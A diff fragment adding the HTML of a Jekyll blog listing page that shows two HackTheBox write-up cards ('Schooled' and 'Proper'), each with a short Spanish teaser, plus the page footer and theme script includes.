+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335banner.png" alt="HackTheBox - Schooled"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/schooled">HackTheBox - Schooled</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina FreeBSD nivel medio, linda locura, nos moveremos mucho por Moodle robando cookies, cambiando roles a los cuales no deberíamos cambiar e instalando plugins maliciosos. Crackearemos hashes y finalmente aprovecharemos...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">11 Sep 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/proper">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321banner.png" alt="HackTheBox - Proper"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/proper">HackTheBox - Proper</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel difícil. Agregamos sal a nuestra inyección SQL, jugaremos a ganar la race condition y finalmente entre reversing, movimiento lateral, creación de scripts en PowerShell y pipes conseguiremos...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">21 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
